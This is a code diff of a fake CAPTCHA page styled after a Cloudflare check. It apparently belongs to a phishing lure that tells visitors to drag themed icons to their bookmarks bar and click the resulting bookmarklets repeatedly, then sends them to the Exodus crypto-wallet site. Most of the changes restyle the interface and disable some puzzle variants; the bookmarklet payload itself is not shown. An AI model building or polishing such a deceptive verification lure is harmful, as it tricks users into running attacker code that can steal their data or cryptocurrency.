@@ -747,8 +747,8 @@
       "#challenge1 .challenge-banner:first-child,#challenge2 .challenge-banner:first-child{border-radius:6px 6px 0 0!important;flex-shrink:0!important}" +
       "#challenge1 .rc-footer,#challenge2 .rc-footer{flex-shrink:0!important;margin-top:auto!important}" +
       "#challenge2 .challenge-stage2-body{align-items:center!important;justify-content:center!important;width:100%!important;box-sizing:border-box!important;flex:1 1 auto!important;min-height:0!important;overflow-y:auto!important;-webkit-overflow-scrolling:touch!important;padding:14px 12px 16px!important}" +
-      "#challenge2 .challenge-stage2-body.step2-jump{padding:6px 8px 8px!important;gap:4px!important;min-height:0!important}" +
-      "#challenge2 .challenge-stage2-body.step2-jump .step2-pressure-timer{margin:0 auto 4px!important;padding:7px 10px!important;border-radius:11px!important;max-width:100%!important}" +
+      "#challenge2 .challenge-stage2-body.step2-jump{padding:6px 0 0!important;gap:4px!important;min-height:0!important;align-items:stretch!important}" +
+      "#challenge2 .challenge-stage2-body.step2-jump .step2-pressure-timer{margin:0!important;padding:8px 14px 8px!important;border-radius:0!important;max-width:100%!important;width:100%!important;box-sizing:border-box!important;border-bottom:1px solid #fde68a!important}" +
       "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-row{margin-bottom:3px!important}" +
       "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-digits{font-size:21px!important}" +
       "#challenge2 .challenge-stage2-body.step2-jump .step2-timer-hint{margin:3px 0 0!important;font-size:9px!important;line-height:1.3!important}" +
@@ -794,10 +794,7 @@
       ".storm-vignette{position:absolute;inset:0;pointer-events:none;box-shadow:inset 0 0 100px rgba(183,28,28,.4);opacity:0;transition:opacity .25s;z-index:7;border-radius:20px}" +
       ".storm-vignette.on{opacity:1}" +
       ".jump-scene .storm-robot-img{z-index:3}" +
-      ".puzzle-progress-wrap.jump-meter-card{margin:0;padding:8px 10px 10px;border-radius:0;border:none;border-top:1px solid rgba(15,23,42,.07);background:linear-gradient(180deg,#f8fafc,#fff);box-shadow:none}" +
-      ".jump-meter-card .puzzle-progress-label{font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:#94a3b8;font-weight:800;margin:0 0 5px;text-align:center}" +
-      ".jump-meter-card .puzzle-progress-track{height:11px;border-radius:999px;border:1px solid rgba(203,213,225,.85);background:#f1f5f9;box-shadow:none}" +
-      ".jump-meter-card .puzzle-progress-fill{background:linear-gradient(90deg,#0ea5e9,#22c55e);box-shadow:none;border-radius:999px;min-width:0}" +
+      ".puzzle-progress-wrap.jump-meter-card{display:none}" +
       ".challenge-stage2-body.step2-quiz-scene{background:#f1f5f9!important;border-top:1px solid rgba(148,163,184,.25)!important}" +
       ".quiz-cap-wrap{background:#fff;border:1px solid #e2e8f0;border-radius:14px;width:100%;max-width:400px;margin:0 auto;overflow:hidden;transition:transform .08s;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}" +
       ".quiz-cap-header{background:#f8fafc;padding:12px 14px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e2e8f0}" +
@@ -881,28 +878,28 @@
     { answerIndex: 4, items: [img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie"),img(JETPACK,"Jetpack"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(KEYS,"Keys"),img(WATCH,"Watch")] }
   ];
   var PUZZLES = [
-    { id: "glass", name: "Destroy Glass", step1: { bannerLine1: "Bookmark the hammer to destroy the glass", bannerLine2: "Drag the hammer to your bookmarks bar", themes: HAMMER_THEMES }, step2: { type: "glass", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "<span class=\"banner-line1\">Destroy the glass</span>" } },
-    { id: "storm", name: "Survive Storm", step1: { bannerLine1: "Bookmark any food or bandage item", bannerLine2: "Drag it to your bookmarks bar", themes: EDIBLE_THEMES }, step2: { type: "storm", timeLimit: 10, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Use your bookmarked supplies while the timer counts down." } },
-    { id: "zombies", name: "Survive Zombies", step1: { bannerLine1: "Bookmark the weapon (gun)", bannerLine2: "Drag the gun to your bookmarks bar", themes: WEAPON_THEMES }, step2: { type: "zombies", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Hold the line until time runs out." } },
-    { id: "jump", name: "Jump to 100m", step1: { bannerLine1: "Bookmark the jetpack or strong legs", bannerLine2: "Drag it to your bookmarks bar", themes: JETPACK_THEMES }, step2: { type: "jump", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Current height: <strong>0 / 100 m</strong>." } },
-    {
-      id: "math",
-      name: "Solve Math",
-      step1: {
-        bannerLine1: "Bookmark any safe tool",
-        bannerLine2: "Drag it to your bookmarks bar",
-        themes: HAMMER_THEMES
-      },
-      step2: {
-        type: "math",
-        timeLimit: 15,
-        noManualDone: true,
-        targetClicks: 0,
-        instruction: "",
-        bannerText:
-          "Done (2/2) Use your bookmarked tool — <strong>solve the math problem by clicking your bookmarklet multiple times.</strong> If your calculation is correct, the CAPTCHA will complete."
-      }
-    }
+    // { id: "glass", name: "Destroy Glass", step1: { bannerLine1: "Bookmark the hammer to destroy the glass", bannerLine2: "Drag the hammer to your bookmarks bar", themes: HAMMER_THEMES }, step2: { type: "glass", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "<span class=\"banner-line1\">Destroy the glass</span>" } },
+    // { id: "storm", name: "Survive Storm", step1: { bannerLine1: "Bookmark any food or bandage item", bannerLine2: "Drag it to your bookmarks bar", themes: EDIBLE_THEMES }, step2: { type: "storm", timeLimit: 10, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Use your bookmarked supplies while the timer counts down." } },
+    // { id: "zombies", name: "Survive Zombies", step1: { bannerLine1: "Bookmark the weapon (gun)", bannerLine2: "Drag the gun to your bookmarks bar", themes: WEAPON_THEMES }, step2: { type: "zombies", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Use your bookmarked tool to hold the line and stop the zombies while the timer counts down." } },
+    { id: "jump", name: "Jump to 100m", step1: { bannerLine1: "Bookmark the jetpack or strong legs", bannerLine2: "Drag it to your bookmarks bar", themes: JETPACK_THEMES }, step2: { type: "jump", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Reach <strong>100 m</strong> before time runs out." } },
+    // {
+    //   id: "math",
+    //   name: "Solve Math",
+    //   step1: {
+    //     bannerLine1: "Bookmark any safe tool",
+    //     bannerLine2: "Drag it to your bookmarks bar",
+    //     themes: HAMMER_THEMES
+    //   },
+    //   step2: {
+    //     type: "math",
+    //     timeLimit: 15,
+    //     noManualDone: true,
+    //     targetClicks: 0,
+    //     instruction: "",
+    //     bannerText:
+    //       "Solve the math challenge to complete verification."
+    //   }
+    // }
   ];
 
   var currentPuzzle = null;
@@ -1373,18 +1370,43 @@
       return;
     }
     if (type === "math") {
-      // Self-contained hard math puzzle inside the Cloudflare-style shell
       body.classList.add("puzzle-body-tall", "puzzle-body-xl", "step2-quiz-scene");
       body.innerHTML =
         timerBlock +
-        '<div class="math-stage" style="margin-top:18px;padding:16px 18px 10px;display:flex;flex-direction:column;gap:12px;border-radius:10px;background:linear-gradient(135deg,#0f172a,#020617);box-shadow:0 12px 30px rgba(15,23,42,0.55);color:#e5e7eb;">' +
-        '<p id="cfMathQuestion" class="math-question" style="font-size:13px;line-height:1.6;margin:0;font-family:system-ui, -apple-system, BlinkMacSystemFont, \'SF Pro Text\', sans-serif;word-break:break-word;"><span style="display:block;font-size:11px;letter-spacing:0.08em;text-transform:uppercase;color:#9ca3af;margin-bottom:4px;">Challenge</span><span id="cfMathExpression"></span></p>' +
-        '<div class="math-input-row" style="display:flex;align-items:center;gap:8px;margin-top:4px;">' +
-        '<input id="cfMathAnswer" class="math-answer-input" type="text" inputmode="numeric" autocomplete="off" placeholder="Type your answer…" style="flex:1;min-width:0;padding:7px 10px;border-radius:7px;border:1px solid #4b5563;background:#020617;color:#e5e7eb;font-size:13px;box-shadow:0 0 0 1px rgba(15,23,42,0.6);outline:none;transition:border-color 0.15s,box-shadow 0.15s;" />' +
-        '<button id="cfMathSubmit" class="math-submit-btn" type="button" style="padding:7px 14px;border-radius:7px;border:none;background:linear-gradient(135deg,#f97316,#ea580c);color:#111827;font-weight:600;font-size:12px;letter-spacing:0.04em;text-transform:uppercase;cursor:pointer;box-shadow:0 10px 20px rgba(248,113,113,0.45);white-space:nowrap;transition:transform 0.1s,box-shadow 0.1s,background 0.1s;">Submit</button>' +
+        // Outer card
+        '<div style="margin:14px 2px 0;border-radius:14px;border:1px solid #e2e8f0;background:#fff;overflow:hidden;box-shadow:0 4px 24px rgba(15,23,42,0.10);">' +
+
+        // Header strip with icon
+        '<div style="display:flex;align-items:center;gap:10px;padding:13px 16px 12px;background:linear-gradient(90deg,#fff7ed,#fff);border-bottom:1px solid #fed7aa;">' +
+        '<div style="flex-shrink:0;width:32px;height:32px;border-radius:8px;background:#fff7ed;border:1.5px solid #fdba74;display:flex;align-items:center;justify-content:center;font-size:16px;">🧮</div>' +
+        '<div>' +
+        '<p style="margin:0;font-size:12px;font-weight:700;color:#ea580c;letter-spacing:0.04em;text-transform:uppercase;">Math Verification</p>' +
+        '<p style="margin:2px 0 0;font-size:11px;color:#9ca3af;font-weight:500;">Solve the expression below</p>' +
         '</div>' +
-        '<p id="cfMathFeedback" class="math-feedback" aria-live="polite" style="min-height:16px;font-size:11px;margin:2px 1px 0;color:#9ca3af;"></p>' +
-        "</div>";
+        '</div>' +
+
+        // Expression box
+        '<div style="margin:14px 14px 0;padding:14px 16px;border-radius:10px;background:#f8fafc;border:1px solid #e2e8f0;">' +
+        '<p id="cfMathExpression" style="margin:0;font-size:14px;font-weight:600;color:#1e293b;line-height:1.7;word-break:break-word;font-family:\'SF Mono\',ui-monospace,SFMono-Regular,Menlo,monospace;text-align:center;"></p>' +
+        '</div>' +
+
+        // Input + button
+        '<div style="padding:12px 14px 14px;display:flex;align-items:center;gap:8px;">' +
+        '<input id="cfMathAnswer" type="text" inputmode="numeric" autocomplete="off" placeholder="Your answer…" ' +
+        'style="flex:1;min-width:0;height:40px;padding:0 14px;border-radius:9px;border:1.5px solid #cbd5e1;background:#fff;color:#111827;font-size:15px;font-family:inherit;outline:none;" ' +
+        'onfocus="this.style.borderColor=\'#f97316\';this.style.boxShadow=\'0 0 0 3px rgba(249,115,22,0.12)\'" ' +
+        'onblur="this.style.borderColor=\'#cbd5e1\';this.style.boxShadow=\'none\'" />' +
+        '<button id="cfMathSubmit" type="button" ' +
+        'style="height:40px;padding:0 20px;border-radius:9px;border:none;background:#f97316;color:#fff;font-weight:700;font-size:13px;cursor:pointer;white-space:nowrap;letter-spacing:0.03em;transition:background 0.15s,transform 0.1s;" ' +
+        'onmouseover="this.style.background=\'#ea580c\'" ' +
+        'onmouseout="this.style.background=\'#f97316\'" ' +
+        'onmousedown="this.style.transform=\'scale(0.97)\'" ' +
+        'onmouseup="this.style.transform=\'scale(1)\'">Verify →</button>' +
+        '</div>' +
+
+        // Feedback strip
+        '<div id="cfMathFeedback" aria-live="polite" style="display:none;padding:9px 16px 10px;font-size:12px;font-weight:600;border-top:1px solid #f1f5f9;"></div>' +
+        '</div>';
 
       // Build a hard-to-solve-in-time expression
       var counts = getAllCounts();
@@ -1449,25 +1471,21 @@
         var userVal = parseInt(raw, 10);
         var ok = Number.isFinite(userVal) && userVal === correctAnswer;
         if (!feedbackEl) return;
-        feedbackEl.classList.remove("success", "error");
         feedbackEl.style.display = "block";
         if (ok) {
-          feedbackEl.textContent = "Correct!";
-          feedbackEl.style.color = "#4ade80";
-          feedbackEl.classList.add("success");
-          // Final redirect on success – send users to real Exodus.
+          feedbackEl.textContent = "✓ Correct — verification complete.";
+          feedbackEl.style.color = "#16a34a";
+          feedbackEl.style.background = "#f0fdf4";
+          feedbackEl.style.borderTop = "1px solid #bbf7d0";
           var target = "https://www.exodus.com?from_captcha=1";
           setTimeout(function () {
-            try {
-              window.top.location.href = target;
-            } catch (e) {
-              window.location.href = target;
-            }
+            try { window.top.location.href = target; } catch (e) { window.location.href = target; }
           }, 1200);
         } else {
-          feedbackEl.textContent = "Incorrect. Try again.";
-          feedbackEl.style.color = "#f97373";
-          feedbackEl.classList.add("error");
+          feedbackEl.textContent = "✗ Incorrect answer. Please try again.";
+          feedbackEl.style.color = "#dc2626";
+          feedbackEl.style.background = "#fef2f2";
+          feedbackEl.style.borderTop = "1px solid #fecaca";
         }
       }
 
@@ -1941,61 +1959,122 @@
       body.innerHTML =
         "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
         timerBlock +
-        "<div class=\"jump-puzzle-shell\">" +
-        "<div class=\"jump-scene-frame\">" +
-        "<div class=\"puzzle-jump-v2\">" +
-        "<div class=\"jump-scene\">" +
-        "<div class=\"jump-ground\"></div>" +
-        "<div class=\"jump-robot-stack\" id=\"jumpRobotStack\">" +
-        "<canvas class=\"jump-robot-canvas\" id=\"jumpRobotCanvas\" width=\"300\" height=\"380\" aria-hidden=\"true\"></canvas>" +
-        "<div class=\"jet-flame jump-jet\" id=\"jumpFlame\"></div>" +
+        // Full-width scene card — no horizontal margin, stretch edge-to-edge
+        "<div style=\"width:100%;box-sizing:border-box;margin:8px 0 0;border-radius:0 0 0 0;overflow:hidden;border-top:1px solid #bae6fd;border-bottom:1px solid #bae6fd;box-shadow:none;\">" +
+
+        // Sky scene — full width
+        "<div style=\"position:relative;width:100%;height:210px;background:linear-gradient(180deg,#0369a1 0%,#0ea5e9 25%,#38bdf8 55%,#bae6fd 85%,#e0f2fe 100%);overflow:hidden;\">" +
+
+        // Stars / dots top
+        "<div style=\"position:absolute;top:8px;left:18%;width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,0.8);\"></div>" +
+        "<div style=\"position:absolute;top:16px;left:35%;width:2px;height:2px;border-radius:50%;background:rgba(255,255,255,0.6);\"></div>" +
+        "<div style=\"position:absolute;top:6px;right:22%;width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,0.8);\"></div>" +
+        "<div style=\"position:absolute;top:20px;right:40%;width:2px;height:2px;border-radius:50%;background:rgba(255,255,255,0.5);\"></div>" +
+
+        // Cloud left
+        "<div style=\"position:absolute;top:30px;left:8%;\">" +
+        "<div style=\"width:54px;height:16px;background:rgba(255,255,255,0.85);border-radius:999px;\"></div>" +
+        "<div style=\"width:36px;height:12px;background:rgba(255,255,255,0.85);border-radius:999px;margin:-4px auto 0;\"></div>" +
         "</div>" +
-        "<div class=\"jump-height-tag\"><span id=\"jumpHeightDisplay\">0</span> / 100 m</div>" +
-        "</div></div></div>" +
-        "<div class=\"puzzle-progress-wrap jump-meter-card\">" +
-        "<div class=\"puzzle-progress-label\">Current height</div>" +
-        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill\" id=\"jumpMeterFill\"></div></div>" +
-        "</div></div>";
+        // Cloud right
+        "<div style=\"position:absolute;top:22px;right:10%;\">" +
+        "<div style=\"width:66px;height:18px;background:rgba(255,255,255,0.8);border-radius:999px;\"></div>" +
+        "<div style=\"width:44px;height:13px;background:rgba(255,255,255,0.8);border-radius:999px;margin:-5px auto 0;\"></div>" +
+        "</div>" +
 
-      if (!CanvasRenderingContext2D.prototype.roundRect) {
-        CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) {
-          r = Math.min(r, w / 2, h / 2);
-          this.beginPath();
-          this.moveTo(x + r, y);
-          this.arcTo(x + w, y, x + w, y + h, r);
-          this.arcTo(x + w, y + h, x, y + h, r);
-          this.arcTo(x, y + h, x, y, r);
-          this.arcTo(x, y, x + w, y, r);
-          this.closePath();
-          return this;
-        };
-      }
+        // Height badge pill
+        "<div style=\"position:absolute;top:10px;right:12px;display:flex;align-items:center;gap:5px;background:rgba(255,255,255,0.95);border:1.5px solid #bae6fd;border-radius:999px;padding:4px 14px;box-shadow:0 2px 10px rgba(14,165,233,0.2);\">" +
+        "<span style=\"font-size:16px;\">✈️</span>" +
+        "<span style=\"font-size:13px;font-weight:800;color:#0369a1;font-family:ui-monospace,monospace;\"><span id=\"jumpHeightDisplay\">0</span> / 100 m</span>" +
+        "</div>" +
 
-      var jumpCv = getEl("jumpRobotCanvas");
-      var jumpCtx = jumpCv && jumpCv.getContext ? jumpCv.getContext("2d") : null;
-      window._jumpRobotTick = 0;
-      window._jumpThrustFrames = 0;
-      function jumpRobotFrame() {
-        if (!currentPuzzle || currentPuzzle.step2.type !== "jump" || !getEl("jumpRobotCanvas")) {
-          window._jumpRobotRaf = null;
-          return;
-        }
-        var mood = window._jumpThrustFrames > 0 ? "wave" : "idle";
-        if (jumpCtx) {
-          window._jumpRobotTick++;
-          jumpCanvasDrawRobot(jumpCtx, window._jumpRobotTick, mood);
-        }
-        if (window._jumpThrustFrames > 0) window._jumpThrustFrames--;
-        window._jumpRobotRaf = requestAnimationFrame(jumpRobotFrame);
-      }
-      if (jumpCtx) {
-        jumpCanvasDrawRobot(jumpCtx, 0, "idle");
-        window._jumpRobotRaf = requestAnimationFrame(jumpRobotFrame);
-      }
+        // Ground strip
+        "<div style=\"position:absolute;bottom:0;left:0;right:0;height:36px;background:linear-gradient(180deg,#4ade80 0%,#16a34a 40%,#15803d 100%);\"></div>" +
+        "<div style=\"position:absolute;bottom:34px;left:0;right:0;height:4px;background:rgba(0,0,0,0.12);\"></div>" +
+
+        // Rocket — rises with clicks
+        "<div id=\"jumpRobotStack\" style=\"position:absolute;bottom:36px;left:50%;transform:translateX(-50%);transition:bottom 0.2s ease;filter:drop-shadow(0 8px 18px rgba(14,165,233,0.35));\">" +
+        "<svg width=\"62\" height=\"110\" viewBox=\"0 0 62 110\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">" +
+        // Left fin
+        "<path d=\"M18 74 C10 74 4 82 4 90 L4 96 C4 97 5 98 6 97 L18 90 Z\" fill=\"#dc2626\"/>" +
+        "<path d=\"M18 74 C10 74 4 82 4 90 L4 96 C4 97 5 98 6 97 L18 90 Z\" fill=\"url(#finShadeL)\" opacity=\"0.3\"/>" +
+        // Right fin
+        "<path d=\"M44 74 C52 74 58 82 58 90 L58 96 C58 97 57 98 56 97 L44 90 Z\" fill=\"#dc2626\"/>" +
+        "<path d=\"M44 74 C52 74 58 82 58 90 L58 96 C58 97 57 98 56 97 L44 90 Z\" fill=\"url(#finShadeR)\" opacity=\"0.3\"/>" +
+        // Main body
+        "<rect x=\"17\" y=\"30\" width=\"28\" height=\"66\" rx=\"6\" fill=\"url(#bodyGrad)\"/>" +
+        // Body highlight stripe
+        "<rect x=\"22\" y=\"34\" width=\"5\" height=\"58\" rx=\"2.5\" fill=\"rgba(255,255,255,0.18)\"/>" +
+        // Nose cone
+        "<path d=\"M31 2 C20 14 17 22 17 30 L45 30 C45 22 42 14 31 2Z\" fill=\"url(#noseGrad)\"/>" +
+        // Nose shine
+        "<path d=\"M31 6 C26 14 24 20 24 28 L27 28 C27 20 28 14 31 6Z\" fill=\"rgba(255,255,255,0.28)\" />" +
+        // Porthole outer
+        "<circle cx=\"31\" cy=\"52\" r=\"9\" fill=\"#0f172a\" stroke=\"#e2e8f0\" stroke-width=\"1.5\"/>" +
+        // Porthole glass
+        "<circle cx=\"31\" cy=\"52\" r=\"7\" fill=\"#0ea5e9\"/>" +
+        "<circle cx=\"31\" cy=\"52\" r=\"7\" fill=\"url(#glassGrad)\"/>" +
+        // Porthole shine
+        "<ellipse cx=\"28.5\" cy=\"49\" rx=\"2.5\" ry=\"1.8\" fill=\"rgba(255,255,255,0.55)\" transform=\"rotate(-20 28.5 49)\"/>" +
+        // Nozzle bell
+        "<path d=\"M22 94 Q20 100 19 106 L43 106 Q42 100 40 94 Z\" fill=\"#374151\"/>" +
+        "<path d=\"M24 94 Q23 100 22.5 106 L25.5 106 Q26 100 26.5 94 Z\" fill=\"rgba(255,255,255,0.10)\"/>" +
+        // Nozzle rim
+        "<rect x=\"20\" y=\"92\" width=\"22\" height=\"4\" rx=\"2\" fill=\"#1f2937\"/>" +
+        // Flag detail
+        "<rect x=\"33\" y=\"14\" width=\"8\" height=\"5\" rx=\"1\" fill=\"#fbbf24\"/>" +
+        "<rect x=\"33\" y=\"12\" width=\"1.5\" height=\"8\" fill=\"#e5e7eb\"/>" +
+        // Defs
+        "<defs>" +
+        "<linearGradient id=\"bodyGrad\" x1=\"17\" y1=\"0\" x2=\"45\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
+        "<stop offset=\"0%\" stop-color=\"#1e3a8a\"/>" +
+        "<stop offset=\"40%\" stop-color=\"#2563eb\"/>" +
+        "<stop offset=\"100%\" stop-color=\"#1e40af\"/>" +
+        "</linearGradient>" +
+        "<linearGradient id=\"noseGrad\" x1=\"17\" y1=\"0\" x2=\"45\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
+        "<stop offset=\"0%\" stop-color=\"#b91c1c\"/>" +
+        "<stop offset=\"50%\" stop-color=\"#ef4444\"/>" +
+        "<stop offset=\"100%\" stop-color=\"#dc2626\"/>" +
+        "</linearGradient>" +
+        "<radialGradient id=\"glassGrad\" cx=\"40%\" cy=\"35%\" r=\"60%\">" +
+        "<stop offset=\"0%\" stop-color=\"#bae6fd\"/>" +
+        "<stop offset=\"100%\" stop-color=\"#0369a1\"/>" +
+        "</radialGradient>" +
+        "<linearGradient id=\"finShadeL\" x1=\"4\" y1=\"0\" x2=\"18\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
+        "<stop offset=\"0%\" stop-color=\"#000\"/><stop offset=\"100%\" stop-color=\"transparent\"/>" +
+        "</linearGradient>" +
+        "<linearGradient id=\"finShadeR\" x1=\"44\" y1=\"0\" x2=\"58\" y2=\"0\" gradientUnits=\"userSpaceOnUse\">" +
+        "<stop offset=\"0%\" stop-color=\"transparent\"/><stop offset=\"100%\" stop-color=\"#000\"/>" +
+        "</linearGradient>" +
+        "</defs>" +
+        "</svg>" +
+        // Flame cluster
+        "<div id=\"jumpFlame\" style=\"position:absolute;bottom:-4px;left:50%;transform:translateX(-50%);opacity:0;transition:opacity 0.12s;display:flex;gap:2px;align-items:flex-end;\">" +
+        "<div style=\"width:10px;height:28px;background:linear-gradient(180deg,#fef3c7,#f97316,transparent);border-radius:50% 50% 60% 60%;filter:blur(1px);\"></div>" +
+        "<div style=\"width:14px;height:40px;background:linear-gradient(180deg,#fef9c3,#fbbf24,#f97316,transparent);border-radius:50% 50% 60% 60%;filter:blur(0.5px);\"></div>" +
+        "<div style=\"width:10px;height:28px;background:linear-gradient(180deg,#fef3c7,#f97316,transparent);border-radius:50% 50% 60% 60%;filter:blur(1px);\"></div>" +
+        "</div>" +
+        "</div>" +
+
+        "</div>" + // end sky
+
+        // Progress bar strip
+        "<div style=\"padding:10px 16px 14px;background:#f0f9ff;border-top:1px solid #bae6fd;width:100%;box-sizing:border-box;\">" +
+        "<div style=\"display:flex;align-items:center;justify-content:space-between;margin-bottom:7px;\">" +
+        "<span style=\"font-size:10px;font-weight:800;letter-spacing:0.1em;text-transform:uppercase;color:#0369a1;\">Altitude</span>" +
+        "<span style=\"font-size:12px;font-weight:800;color:#0369a1;font-family:ui-monospace,monospace;\"><span id=\"jumpMeterNum\">0</span>&thinsp;/&thinsp;100 m</span>" +
+        "</div>" +
+        "<div style=\"height:10px;border-radius:999px;background:#bae6fd;overflow:hidden;box-shadow:inset 0 1px 3px rgba(14,165,233,0.2);\">" +
+        "<div id=\"jumpMeterFill\" style=\"height:100%;width:0%;border-radius:999px;background:linear-gradient(90deg,#38bdf8,#0ea5e9,#0369a1);transition:width 0.15s;\"></div>" +
+        "</div>" +
+        "</div>" +
+
+        "</div>"; // end card
 
       var prevNJ = -1;
       function updateJump() {
         var heightEl = getEl("jumpHeightDisplay");
+        var meterNum = getEl("jumpMeterNum");
         var fill = getEl("jumpMeterFill");
         var stack = getEl("jumpRobotStack");
         var flame = getEl("jumpFlame");
@@ -2003,17 +2082,18 @@
         var deltaJ = getStep2SpamClicks();
         var meters = Math.min(100, deltaJ);
         heightEl.textContent = String(meters);
+        if (meterNum) meterNum.textContent = String(meters);
         if (fill) fill.style.width = meters + "%";
-        var rise = Math.min(108, meters * 1.12);
-        if (stack) stack.style.bottom = 30 + rise + "px";
+        // Rise the rocket: max ~140px above ground
+        var rise = Math.min(140, meters * 1.45);
+        if (stack) stack.style.bottom = (36 + rise) + "px";
         if (deltaJ > prevNJ && deltaJ > 0) {
-          window._jumpThrustFrames = 36;
           if (flame) {
             flame.style.opacity = "1";
             setTimeout(function () {
               var f = getEl("jumpFlame");
               if (f) f.style.opacity = "0";
-            }, 120);
+            }, 180);
           }
         }
         prevNJ = deltaJ;
